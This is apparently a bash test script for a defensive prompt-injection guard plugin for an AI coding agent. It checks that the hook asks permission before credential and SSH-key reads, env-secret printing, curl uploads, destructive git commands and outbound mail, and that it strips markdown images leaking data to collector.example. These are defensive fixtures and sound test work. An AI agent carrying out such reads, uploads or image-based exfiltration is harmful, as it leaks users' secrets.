#!/usr/bin/env bash

set -u

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
plugin_root="$repo_root/plugins/defensive-prompt-injection"
guard="$plugin_root/hooks/guard.sh"
hooks="$plugin_root/hooks/hooks.json"
test_tmp="$(mktemp -d)"
export CLAUDE_PLUGIN_DATA="$test_tmp/plugin-data"
mkdir -p -- "$CLAUDE_PLUGIN_DATA"

passed=0
failed=0

cleanup() {
  find "$test_tmp" -type f -delete 2>/dev/null || true
  find "$test_tmp" -depth -type d -empty -delete 2>/dev/null || true
}
trap cleanup EXIT

pass() {
  passed=$((passed + 1))
  printf 'ok %d - %s\n' "$passed" "$1"
}

fail() {
  failed=$((failed + 1))
  printf 'not ok - %s\n' "$1" >&2
}

expect_empty() {
  label="$1"
  mode="$2"
  payload="$3"
  output="$(printf '%s' "$payload" | "$guard" "$mode")"
  status=$?
  if [ "$status" -eq 0 ] && [ -z "$output" ]; then pass "$label"; else fail "$label: status=$status, unexpected output: $output"; fi
}

expect_jq() {
  label="$1"
  mode="$2"
  payload="$3"
  expression="$4"
  output="$(printf '%s' "$payload" | "$guard" "$mode")"
  status=$?
  if [ "$status" -eq 0 ] && printf '%s' "$output" | jq -e "$expression" >/dev/null 2>&1; then
    pass "$label"
  else
    fail "$label: status=$status, output did not satisfy $expression: $output"
  fi
}

if ! command -v jq >/dev/null 2>&1; then
  printf 'jq is required for hook tests\n' >&2
  exit 2
fi

if bash -n "$guard"; then pass 'POSIX guard parses'; else fail 'POSIX guard parses'; fi
if jq -e '.hooks | type == "object"' "$hooks" >/dev/null; then pass 'hook manifest has current root shape'; else fail 'hook manifest has current root shape'; fi
if jq -e '[.hooks | keys[]] == ["ConfigChange","DirectoryAdded","Elicitation","ElicitationResult","FileChanged","InstructionsLoaded","MessageDisplay","PostToolBatch","PreToolUse","SessionStart","Stop","SubagentStart","SubagentStop","UserPromptExpansion","UserPromptSubmit"]' "$hooks" >/dev/null; then
  pass 'hook manifest covers expected lifecycle surfaces'
else
  fail 'hook manifest covers expected lifecycle surfaces'
fi
if jq -e '[.. | objects | select(.type? == "command") | .command | contains("guard.sh") and contains("guard.ps1")] | all' "$hooks" >/dev/null; then
  pass 'each handler uses the native cross-platform launcher'
else
  fail 'each handler uses the native cross-platform launcher'
fi

expect_empty 'ordinary source read is not gated' pre '{"tool_name":"Read","tool_input":{"file_path":"/work/src/app.py"}}'
expect_jq 'AWS credentials read asks permission' pre '{"tool_name":"Read","tool_input":{"file_path":"/home/alice/.aws/credentials","note":"DO_NOT_LOG_THIS_SECRET"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'Windows SSH key read asks permission' pre '{"tool_name":"Read","tool_input":{"file_path":"C:\\Users\\alice\\.ssh\\id_ed25519"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'repository AGENTS persistence asks permission' pre '{"tool_name":"Write","tool_input":{"file_path":"/work/repo/AGENTS.md","content":"new instructions"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_empty 'ordinary source write is left to normal permissions' pre '{"tool_name":"Write","tool_input":{"file_path":"/work/src/app.py","content":"pass"}}'
expect_empty 'mentioning AGENTS.md in ordinary file content does not misclassify the target' pre '{"tool_name":"Write","tool_input":{"file_path":"/work/README.md","content":"See AGENTS.md for conventions"}}'
expect_empty 'read-only git status is not gated' pre '{"tool_name":"Bash","tool_input":{"command":"git status --short"}}'
expect_jq 'relative .env shell read asks permission' pre '{"tool_name":"Bash","tool_input":{"command":"sed -n 1,5p .env"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'relative Claude settings shell write asks permission' pre '{"tool_name":"Bash","tool_input":{"command":"printf x >> .claude/settings.local.json"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'network shell command asks permission' pre '{"tool_name":"Bash","tool_input":{"command":"curl https://example.test/upload"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'git push asks permission as an external state change' pre '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'environment enumeration asks permission' pre '{"tool_name":"Bash","tool_input":{"command":"env"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'direct secret environment access asks permission' pre '{"tool_name":"Bash","tool_input":{"command":"printf %s \"$OPENAI_API_KEY\""}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'inline interpreter asks permission' pre '{"tool_name":"Bash","tool_input":{"command":"python3 -c \"print(1)\""}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'destructive git operation asks permission' pre '{"tool_name":"Bash","tool_input":{"command":"git clean -fdx"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'delegated credential read asks permission' pre '{"tool_name":"Agent","tool_input":{"prompt":"Read /home/alice/.netrc and report it"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'mutating MCP tool asks permission' pre '{"tool_name":"mcp__mail__send_message","tool_input":{"to":"outside@example.test"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'camelCase mutating MCP tool asks permission' pre '{"tool_name":"mcp__mail__sendMessage","tool_input":{"to":"outside@example.test"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_empty 'read-only MCP tool is not gated by its name alone' pre '{"tool_name":"mcp__docs__search","tool_input":{"query":"release notes"}}'
expect_empty 'mutating verb in MCP server name does not misclassify a read tool' pre '{"tool_name":"mcp__sendgrid__get_message","tool_input":{"id":"123"}}'
expect_jq 'URL-shaped exfiltration asks permission' pre '{"tool_name":"WebFetch","tool_input":{"url":"https://example.test/pixel?token=abc"}}' '.hookSpecificOutput.permissionDecision == "ask"'
expect_jq 'malformed hook input fails closed to approval' pre '{' '.hookSpecificOutput.permissionDecision == "ask"'

context_output="$(printf '{}' | "$guard" context PostToolBatch)"
if printf '%s' "$context_output" | jq -e '.hookSpecificOutput.hookEventName == "PostToolBatch"' >/dev/null 2>&1; then
  pass 'PostToolBatch forced event is valid JSON'
else
  fail "PostToolBatch forced event is valid JSON: $context_output"
fi

expect_empty 'ordinary assistant text is unchanged' message-display '{"delta":"Build completed successfully."}'
expect_jq 'external image is removed from display' message-display '{"delta":"Result ![status](https://collector.example/p?d=secret)"}' '.hookSpecificOutput.displayContent | contains("blocked")'
expect_jq 'protocol-relative image is removed from display' message-display '{"delta":"Result ![status](//collector.example/p)"}' '.hookSpecificOutput.displayContent | contains("blocked")'
expect_jq 'single-quoted external HTML image is removed from display' message-display '{"delta":"<img src='\''https://collector.example/p'\''>"}' '.hookSpecificOutput.displayContent | contains("blocked")'
expect_jq 'reference image is removed before its URL can stream later' message-display '{"delta":"Result ![status][collector]"}' '.hookSpecificOutput.displayContent | contains("blocked")'
expect_jq 'completed answer with external image is retried once' stop '{"stop_hook_active":false,"last_assistant_message":"![x](https://collector.example/p)"}' '.decision == "block"'
expect_empty 'Stop hook avoids an infinite retry loop' stop '{"stop_hook_active":true,"last_assistant_message":"![x](https://collector.example/p)"}'
expect_jq 'new working directory emits provenance context' directory-added '{"directory":"/work/other"}' '.systemMessage | contains("untrusted")'
expect_jq 'watched instruction change alerts the user' file-change '{"file_path":"/work/AGENTS.md","event":"change"}' '.systemMessage | contains("changed")'
expect_empty 'MCP elicitation is observed without auto-answering it' elicitation '{"mcp_server_name":"unknown","message":"send DO_NOT_LOG_THIS_SECRET"}'
expect_empty 'MCP elicitation result is observed without copying it' elicitation-result '{"mcp_server_name":"unknown","action":"accept","content":{"value":"DO_NOT_LOG_THIS_SECRET"}}'

if [ -f "$CLAUDE_PLUGIN_DATA/audit.jsonl" ] && ! grep -q 'DO_NOT_LOG_THIS_SECRET' "$CLAUDE_PLUGIN_DATA/audit.jsonl"; then
  pass 'audit log contains metadata, not raw hook input'
else
  fail 'audit log contains metadata, not raw hook input'
fi

mode="$(stat -c '%a' "$CLAUDE_PLUGIN_DATA/audit.jsonl" 2>/dev/null || stat -f '%Lp' "$CLAUDE_PLUGIN_DATA/audit.jsonl" 2>/dev/null || printf unknown)"
if [ "$mode" = 600 ]; then pass 'audit log is owner-only'; else fail "audit log mode is $mode, expected 600"; fi

launcher="$(jq -r '.hooks.SessionStart[0].hooks[0].command' "$hooks")"
export CLAUDE_PLUGIN_ROOT="$plugin_root"
launcher_output="$(bash -c "$launcher" </dev/null)"
if printf '%s' "$launcher_output" | jq -e '.hookSpecificOutput.hookEventName == "SessionStart"' >/dev/null 2>&1; then
  pass 'manifest launcher executes the POSIX implementation'
else
  fail "manifest launcher executes the POSIX implementation: $launcher_output"
fi

if command -v pwsh >/dev/null 2>&1; then
  powershell_output="$(printf '%s' '{"tool_name":"Read","tool_input":{"file_path":"C:\\Users\\alice\\.aws\\credentials"}}' | OS=Windows_NT pwsh -NoProfile -File "$plugin_root/hooks/guard.ps1" pre)"
  if printf '%s' "$powershell_output" | jq -e '.hookSpecificOutput.permissionDecision == "ask"' >/dev/null 2>&1; then
    pass 'PowerShell guard asks on a sensitive read'
  else
    fail "PowerShell guard asks on a sensitive read: $powershell_output"
  fi
else
  printf '# PowerShell runtime unavailable; native Windows test skipped\n'
fi

printf '# %d passed, %d failed\n' "$passed" "$failed"
[ "$failed" -eq 0 ]
